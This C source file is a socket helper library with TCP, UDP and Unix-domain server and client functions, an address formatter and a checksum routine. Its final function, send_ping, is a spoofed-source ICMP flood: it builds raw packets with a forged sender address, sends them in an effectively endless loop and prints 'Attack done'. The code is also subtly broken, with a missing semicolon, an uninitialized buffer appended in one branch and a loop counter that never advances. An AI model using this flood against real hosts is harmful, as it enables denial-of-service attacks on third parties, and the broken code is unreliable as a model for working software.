#include "socketlib.h"

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <error.h>
#include <stdlib.h>
#include <string.h>


int socketlib_error(const char* str)
{
  fprintf(stderr, "ERROR in socketlib: %s\nErrno: %d, Errnomsg: %s\n",
          str, errno, strerror(errno));
  
  exit(errno);
}

char* socket_atop(int sock, char* buf, uint16_t buf_size)
{
  struct sockaddr_storage saddr;
  socklen_t saddrlen;
  static char sbuf[ADDR_STRING_LEN];
  char port_str[8];
  char *buf_to_use;
  int ret;

  if(buf != NULL && buf_size < ADDR_STRING_LEN) {
    socketlib_error("Provided buf to socket_atop is to small!");
  }

  //Decide on which buffer to put the put the result in.
  buf_to_use = (buf == NULL) ? sbuf:buf;

  //Find the address of the socket by calling getsockname
  saddrlen = sizeof(struct sockaddr_storage);
  if( (ret = getsockname(sock, (SA*) &saddr, &saddrlen)) == -1 ) {
    socketlib_error("Error in the call to getsockname");
  }

  //Based on the type in the sockaddr struct use the appropriate way to extract the rep
  switch(saddr.ss_family) {

  case AF_INET: {
    struct sockaddr_in *addr = (struct sockaddr_in*)&saddr;
    if(inet_ntop(AF_INET, &addr->sin_addr, buf_to_use, ADDR_STRING_LEN) == NULL)
      socketlib_error("Call to inet_ntop failed");
    
    uint16_t port = ntohs(addr->sin_port);
    if(snprintf(port_str, 8, ":%d", port) < 0) {
      socketlib_error("Call to snprintf failed");
    }

    strncat(buf_to_use, port_str, ADDR_STRING_LEN);
    break;
  }

  case AF_INET6: {
    struct sockaddr_in6 *addr = (struct sockaddr_in6*)&saddr;
    if(inet_ntop(AF_INET6, &addr->sin6_addr, buf_to_use, ADDR_STRING_LEN) == NULL)
      socketlib_error("Call to inet_ntop failed");

    uint16_t port = ntohs(addr->sin6_port);
    if(snprintf(port_str, 8, ":%d", port) < 0) {
      socketlib_error("Call to snprintf failed");
    }   

    strncat(buf_to_use, port_str, ADDR_STRING_LEN);
    break;
  }
    
  case AF_LOCAL: {
    struct sockaddr_un *addr = (struct sockaddr_un*)&saddr;
    strncat(buf_to_use, addr->sun_path, ADDR_STRING_LEN);
    strncat(buf_to_use, port_str, ADDR_STRING_LEN);
    break;
  }
  }

  //return a pointer to the buf
  return buf_to_use;
}

int create_unix_server(const char* path_name)
{

  struct sockaddr_un addr;
  int sock; /*The returned socket fd*/
  int ret_value; /*Used to store return values from function calls*/

  /*clearing all variables*/
  bzero( &addr, sizeof(addr));
  sock = -1;
  ret_value = 0;
 
  addr.sun_family = AF_UNIX;
  strncpy(addr.sun_path, path_name, UNIX_PATH_MAX);
  unlink(addr.sun_path);
 
  sock = socket( AF_UNIX, SOCK_STREAM, 0 );
  if( sock < 0 )
    socketlib_error("Error in call to socket");

  if( bind( sock, (SA*)&addr, SUN_LEN(&addr)) != 0 )
    socketlib_error("Error in call to bind");

  ret_value = listen( sock, 10 );
  if( ret_value < 0 ) {
    return socketlib_error("Error in the call to listen");
  }

  return sock;
}

int connect_to_unix_server(const char* path_name)
{
  struct sockaddr_un addr;
  int sock; /*The returned socket fd*/
  int ret_value; /*Used to store return values from function calls*/

  /*clearing all variables*/
  bzero( &addr, sizeof(addr));
  sock = -1;
  ret_value = 0;
 
  addr.sun_family = AF_UNIX;
  strncpy(addr.sun_path, path_name, UNIX_PATH_MAX);
 
  sock = socket( AF_UNIX, SOCK_STREAM, 0 );
  if( sock < 0 )
    socketlib_error("Error in call to socket");

  fprintf(stderr, "%s",path_name);
  ret_value = connect(sock, (SA*)&addr,SUN_LEN(&addr));
  if( ret_value < 0 ) {
    return socketlib_error("Error in the call to connect");
  }

  return sock;
  
}

int create_server_client(const char *node, const char *port,
                         int st, int p, uint8_t type)
{
 struct addrinfo *serverinfo, hints;
 struct addrinfo *itr;
 int sock; /*The returned socket fd*/
 int ret_value; /*Used to store return values from function calls*/
 int optval = 1;


 /*clearing all variables*/
 memset( &hints, 0, sizeof(hints) );
 serverinfo = 0;
 sock = -1;
 ret_value = 0;
 
 hints.ai_family = AF_UNSPEC;
 hints.ai_socktype = st;
 hints.ai_protocol = p;
 hints.ai_flags = AI_PASSIVE;
 
 ret_value = getaddrinfo( node, port, &hints, &serverinfo );
 if( ret_value < 0 ) {
   return socketlib_error(gai_strerror(ret_value));
 }

 for( itr = serverinfo; itr != NULL; itr = itr->ai_next ) {

   sock = socket( itr->ai_family, itr->ai_socktype, itr->ai_protocol );

   if( sock >= 0 ) { /*Socket was created*/

     if( type == SERVER ) {
       setsockopt( sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof optval);

       if( bind( sock, itr->ai_addr, itr->ai_addrlen ) == 0 ) { /*success*/
         break;
       }
     } else {
       if( connect( sock, itr->ai_addr, itr->ai_addrlen ) != -1 ) { /*success*/
         break;
       }
     }
   }
 }

 freeaddrinfo( serverinfo );


 if( itr == NULL ) {
   return socketlib_error("Unable to connect/bind to any of the addresses provided by getaddrinfo!\n");
 }

 if( type == SERVER ) {
   ret_value = listen( sock, 10 );
   if( ret_value < 0 ) {
     return socketlib_error("Error in the call to listen");
   }
 }

 return sock;
}

int create_tcp_server(const char *node, const char *port)
{
  return create_server_client(node, port, SOCK_STREAM, IPPROTO_TCP, SERVER);
}
int create_udp_server(const char *node, const char *port)
{
  return create_server_client(node, port, SOCK_DGRAM, IPPROTO_UDP, SERVER);
}
int create_datagramtcp_server(const char *node, const char *port)
{
  return create_server_client(node, port, SOCK_SEQPACKET, 0, SERVER);
}

int connect_to_tcp_server(const char *node, const char *port)
{
  return create_server_client(node, port, SOCK_STREAM, IPPROTO_TCP, CLIENT);  
}
/*Copied from online, computes internes checksum */ 
unsigned short in_cksum(unsigned short *ptr, int nbytes)
{
    register long sum;
    u_short oddbyte;
    register u_short answer;
 
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
 
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *) & oddbyte) = *(u_char *) ptr;
        sum += oddbyte;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
 
    return (answer);
}

int send_ping(char* dst, char* src)
{
  uint32_t dst_addr = inet_addr(dst);
  uint32_t src_addr = inet_addr(src);
  int sockfd;
  int enable = 1;
  int packet_size;
  char *packet;
  struct sockaddr_in servaddr;
  
  if ((sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
    {
      perror("Could not create raw socket");
      return EAGAIN;
    }
  
  if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&enable, sizeof(enable)) == -1) 
    {
      perror("setsockopt failed");
      return EACCES;
    }


  packet_size = sizeof(struct iphdr) + sizeof(struct icmphdr);
  packet = calloc(1,packet_size);
  if(!packet) {
    perror("Malloc");
    close(sockfd);
    return EAGAIN;
  }

  /*Construct ip and icmp headers*/
  struct iphdr *ip = (struct iphdr*) packet;
 struct icmphdr *icmp = (struct icmphdr*) (packet + sizeof(struct iphdr));
  
  ip->version = 4;
  ip->ihl = 5;
  ip->tos = 0;
  ip->tot_len = htons(packet_size);
  ip->id = rand();
  ip->frag_off = 0;
  ip->ttl = 15
  ip->protocol = IPPROTO_ICMP;
  ip->saddr = src_addr;
  ip->daddr = dst_addr;
    
  icmp->type = ICMP_ECHO;
  icmp->code = 0;
  icmp->un.echo.sequence = rand();
  icmp->un.echo.id = rand();
  icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr));

  /*Done constructing*/


  memset(&servaddr, 0, sizeof(struct sockaddr_in));
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = dst_addr;
  
  printf("Sending ping to %s\n", inet_ntoa(servaddr.sin_addr));

  int i = 0;
  while(i < 100000000) {
    int sent;
    if( (sent = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*)&servaddr, sizeof(servaddr))) <= 0) 
    {
      perror("Failed sendto\n");
      return 0;
    }
  }

  printf("Attack done");
}
